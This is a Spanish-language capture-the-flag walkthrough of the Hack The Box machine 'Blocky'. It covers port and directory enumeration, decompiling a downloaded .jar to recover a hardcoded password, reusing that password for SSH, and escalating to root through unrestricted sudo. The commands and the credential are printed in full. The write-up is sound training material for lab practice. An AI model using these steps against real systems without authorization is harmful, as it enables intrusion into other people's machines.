# Blocky — Hack The Box

**Máquina:** Blocky · **SO:** Linux · **Dificultad:** Easy · **Lista:** TJ Null (OSCP)

| Campo | Detalle |
|---|---|
| Objetivo | `10.129.77.212` (blocky.htb) |
| Sistema | Linux — Ubuntu (Apache 2.4.18, WordPress, servidor Minecraft) |
| Vector de entrada | Credenciales en un .jar descompilado → reutilización en SSH |
| Escalada | sudo (ALL) → root |
| Herramientas | nmap, gobuster, jd-gui, ssh |

---

## 1. Resumen

Blocky es un servidor de Minecraft con una web WordPress. En una carpeta web accesible (`/plugins/`) hay un plugin `.jar` hecho a medida. Al descompilarlo aparecen credenciales de base de datos en el código. Esa contraseña está **reutilizada** para el usuario del sistema `notch`, lo que permite acceso por SSH. La escalada es inmediata: notch tiene permiso sudo total.

---

## 2. Enumeración

```console
$ nmap -p- 10.129.77.212
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
25565/tcp open  minecraft

$ nmap -sC -sV -p 21,22,80,25565 10.129.77.212
21/tcp    open  ftp?
22/tcp    open  ssh       OpenSSH 7.2p2 Ubuntu
80/tcp    open  http      Apache httpd 2.4.18
|_http-title: Did not follow redirect to http://blocky.htb
25565/tcp open  minecraft Minecraft 1.11.2
```

La web redirige a `blocky.htb` → hay que añadirlo a `/etc/hosts`:
```console
$ sudo sh -c 'echo "10.129.77.212 blocky.htb" >> /etc/hosts'
```

Enumeración de rutas:
```console
$ gobuster dir -u http://blocky.htb -w /usr/share/wordlists/dirb/common.txt
wp-admin  wp-content  wp-includes  xmlrpc.php   ← WordPress
phpmyadmin  wiki
plugins   ← carpeta específica de la máquina
```

En `http://blocky.htb/plugins/` hay un explorador de archivos con dos `.jar`:
`BlockyCore.jar` (883 bytes, hecho a medida) y `griefprevention-*.jar` (plugin genérico).

---

## 3. Foothold — credenciales en el .jar + reutilización

Se descarga el plugin casero y se descompila. `strings` no basta (el código está en un `.class` compilado); se usa un descompilador.

```console
$ wget http://blocky.htb/plugins/files/BlockyCore.jar
$ jd-gui BlockyCore.jar
```

El código descompilado contiene credenciales en texto claro:
```java
public class BlockyCore {
    public String sqlHost = "localhost";
    public String sqlUser = "root";
    public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
}
```

La contraseña está **reutilizada** para el usuario del sistema `notch` (autor de los posts del WordPress y guiño al creador de Minecraft):
```console
$ ssh notch@10.129.77.212
notch@10.129.77.212's password: 8YsqfCTnvxAUeduzjNSXe22
notch@Blocky:~$ whoami
notch
```

---

## 4. Escalada: notch → root

```console
notch@Blocky:~$ sudo -l
User notch may run the following commands on Blocky:
    (ALL : ALL) ALL

notch@Blocky:~$ sudo su
root@Blocky:/home/notch# whoami
root
```

> **La técnica:** `sudo -l` muestra `(ALL : ALL) ALL` → notch puede ejecutar cualquier comando como cualquier usuario. `sudo su` da shell de root directa. Es la escalada más simple posible cuando el usuario tiene sudo total.

---

## 5. Resumen de la cadena

| Fase | Acción | Resultado |
|---|---|---|
| Enumeración | nmap + gobuster + /etc/hosts | WordPress, carpeta /plugins |
| Análisis | descompilar BlockyCore.jar (jd-gui) | credenciales en el código |
| Foothold | reutilización de contraseña en SSH (notch) | Shell como notch |
| Escalada | sudo -l → ALL → sudo su | Shell como root |
| Flags | root.txt + user.txt | Máquina completada |

---

## Lecciones

- **`Did not follow redirect to X.htb`** → añadir `IP X.htb` a `/etc/hosts` para que la web resuelva.
- Entre las carpetas estándar de WordPress, buscar las **específicas de la máquina** (/plugins).
- Un `.jar` es Java compilado: `strings` no revela el código, hay que **descompilar** (jd-gui).
- **Reutilización de credenciales:** una contraseña de base de datos puede valer para SSH. Probar siempre.
- FTP software: `ProFTPD 1.3.5a` (obtenido con `nc IP 21` para leer el banner, ya que nmap lo marcó como `ftp?`).
